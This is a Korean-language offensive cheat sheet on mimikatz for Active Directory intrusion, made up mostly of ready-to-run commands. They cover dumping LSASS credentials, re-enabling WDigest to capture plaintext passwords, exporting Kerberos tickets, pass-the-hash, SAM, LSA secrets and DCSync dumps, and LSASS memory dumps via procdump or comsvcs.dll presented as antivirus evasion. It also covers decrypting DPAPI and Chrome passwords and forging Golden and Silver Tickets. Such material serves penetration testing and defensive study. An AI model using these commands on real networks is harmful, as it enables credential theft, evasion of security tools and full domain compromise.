# 04_mimikatz

# AD 내부침투 — mimikatz

---

## 개념

mimikatz는 Windows 자격증명 덤프의 사실상 표준 도구다. LSASS(Local Security Authority Subsystem Service) 프로세스 메모리에서 로그온한 사용자의 NTLM 해시, Kerberos 티켓, 평문 패스워드(WDigest 활성 시), DPAPI 키 등을 추출한다.

실행에는 SeDebugPrivilege가 필요하며, 이는 로컬 관리자 계정으로 실행하면 `privilege::debug` 명령으로 활성화할 수 있다. UAC가 활성화된 환경에서는 관리자 권한으로 실행된 프로세스(관리자로 실행)에서만 동작한다.

Windows 8.1/Server 2012 R2 이후부터 WDigest가 기본 비활성화되어 평문 패스워드 추출이 차단되었다. 그러나 레지스트리 수정으로 WDigest를 활성화한 뒤 피해자가 재로그인하면 이후 다시 평문 패스워드를 추출할 수 있다.

AV/EDR에서 mimikatz.exe를 탐지하는 경우가 많으므로, 메모리 로드, 이름 변경, LSASS 덤프 후 오프라인 파싱 등의 우회 방법을 활용한다.

---

## 기본 설정

```bash
# 관리자 권한으로 mimikatz.exe 실행
privilege::debug
# -> Privilege '20' OK  (성공)
# -> ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 (실패 -> 관리자 권한 부족)

# 버전 확인
version

# 종료
exit
```

---

## LSASS 자격증명 덤프 (핵심)

가장 많이 쓰는 명령이다. 현재 로그온한 모든 사용자의 자격증명을 한 번에 출력한다.

```bash
# 전체 자격증명 덤프
sekurlsa::logonpasswords

# 출력 항목
# - Username, Domain
# - NTLM 해시 (msv 패키지)
# - SHA1 해시
# - 평문 패스워드 (WDigest 활성 시)
# - Kerberos 티켓 (TGT, TGS)

# 특정 패키지만 (속도 빠름)
sekurlsa::msv          # NTLM 해시만
sekurlsa::wdigest      # WDigest 평문 패스워드
sekurlsa::kerberos     # Kerberos 자격증명
sekurlsa::tspkg        # TS 패키지
sekurlsa::credman      # 자격증명 관리자
sekurlsa::dpapi        # DPAPI 마스터 키
```

---

## WDigest 평문 패스워드 활성화 (Windows 10+)

Windows 10 이후 WDigest가 기본 비활성화되어 있다. 레지스트리 수정으로 다시 활성화하면 이후 로그인한 사용자의 평문 패스워드를 추출할 수 있다. 재부팅 없이 적용되지만, 현재 이미 로그인된 세션에는 효과가 없어 재로그인을 기다려야 한다.

```bash
:: mimikatz에서 직접 수정
misc::wdigest

:: 또는 레지스트리 직접 수정
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest ^
  /v UseLogonCredential /t REG_DWORD /d 1

:: 확인
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

:: 피해자 재로그인 후
sekurlsa::wdigest
```

---

## Kerberos 티켓 추출

```bash
# 모든 세션의 티켓을 kirbi 파일로 저장
sekurlsa::tickets /export

# 현재 세션 티켓 목록 + 저장
kerberos::list /export

# 특정 LUID 세션의 티켓 (klist 결과에서 LUID 확인)
sekurlsa::tickets /export /luid:0x1234

# TGT만 필터링해서 확인
sekurlsa::tickets | findstr /i "krbtgt"
```

---

## Pass-the-Hash

```bash
# 새 프로세스 실행 (현재 세션 영향 없음)
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NTLM> /run:cmd.exe
sekurlsa::pth /user:john /domain:corp.local /ntlm:<NTLM> /run:powershell.exe

# 로컬 계정
sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLM> /run:cmd.exe

# AES 키 사용 (더 스텔스)
sekurlsa::pth /user:Administrator /domain:corp.local /aes256:<AES256> /run:cmd.exe
```

---

## SAM 덤프 (로컬 계정 해시)

```bash
# SYSTEM 권한으로 승격 후 SAM 덤프
token::elevate
lsadump::sam

# LSA secrets (서비스 계정 패스워드, 캐시된 크레덴셜 등)
lsadump::secrets

# 캐시된 도메인 자격증명 (오프라인 로그인 시 사용되는 자격증명)
lsadump::cache
```

---

## DCSync (원격 해시 추출)

DC에서 실행할 필요 없이, DCSync 권한(Domain Admin 또는 직접 부여된 복제 권한)으로 원격에서 해시를 추출한다.

```bash
# 특정 계정 해시
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /user:krbtgt

# 전체 도메인 덤프
lsadump::dcsync /domain:corp.local /all /csv
```

---

## LSASS 메모리 덤프 (AV 우회 — 오프라인 파싱)

AV가 mimikatz.exe를 탐지하는 경우, LSASS 메모리를 덤프 파일로 저장한 뒤 다른 머신에서 파싱한다.

```bash
:: Task Manager (GUI)
:: 세부 정보 탭 -> lsass.exe 우클릭 -> 덤프 파일 만들기
:: C:\Users\<user>\AppData\Local\Temp\lsass.DMP 생성

:: procdump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp
procdump.exe -ma -r lsass.exe lsass.dmp   # 복제본 덤프 (더 안전)

:: comsvcs.dll (Windows 기본 내장 — AV 탐지 낮음)
rundll32 C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id lsass.dmp full

:: taskmgr.exe 사용 (GUI 없이)
tasklist | findstr lsass    # PID 확인
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> lsass.dmp full

:: createdump (.NET Runtime 포함 환경)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe -u -f lsass.dmp <PID>
```

```bash
# 칼리에서 오프라인 파싱
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp --json   # JSON 출력
```

```bash
:: impacket 파싱을 위한 레지스트리 하이브 저장 (타겟 Windows에서 실행)
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
reg save HKLM\SECURITY security.hive
:: -> 파일을 칼리로 전송 후
```

```bash
# 칼리에서 hive 파일 파싱
impacket-secretsdump -system system.hive -sam sam.hive -security security.hive LOCAL
```

---

## 자격증명 관리자 덤프

```bash
# Windows 자격증명 저장소
sekurlsa::credman

# DPAPI 마스터 키 (브라우저 저장 패스워드 복호화에 사용)
sekurlsa::dpapi

# 시스템 DPAPI 키 추출
lsadump::dpapi /system

# 사용자 DPAPI 보호 데이터 복호화
dpapi::cred /in:C:\Users\john\AppData\Roaming\Microsoft\Credentials\<GUID>
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
```

---

## Golden / Silver Ticket 생성

```bash
# Golden Ticket 생성 + 주입
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /krbtgt:<KRBTGT_NTLM> ^
  /id:500 /groups:512,513,518,519,520 /ptt

# Silver Ticket 생성 + 주입
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /target:server01.corp.local ^
  /service:CIFS ^
  /rc4:<서비스계정_NTLM> /ptt
```

---

## 원격 실행 (Linux)

```bash
# impacket-secretsdump (자격증명 있을 때)
impacket-secretsdump corp.local/Administrator:'Password1!'@<IP>

# NTLM 해시로
impacket-secretsdump -hashes :<NTLM> corp.local/Administrator@<IP>

# Kerberos 인증
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@dc.corp.local

# 특정 계정만
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator:'Password1!'@<DC_IP>
```

---

## 출력 해석

```
# sekurlsa::logonpasswords 출력 예시
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CORP$               <- 컴퓨터 계정
Domain            : CORP
...
         * Username : john
         * Domain   : CORP
         * NTLM     : <32바이트 NTLM 해시>
         * SHA1     : <40바이트 SHA1 해시>
         * Password : (null)            <- WDigest 비활성 시
         * Password : Password1!       <- WDigest 활성 시 평문
```

---

## 흐름

관리자 권한 셸 확보 → privilege::debug → sekurlsa::logonpasswords → 해시/티켓 추출 → PtH / PtT / DCSync → 권한 상승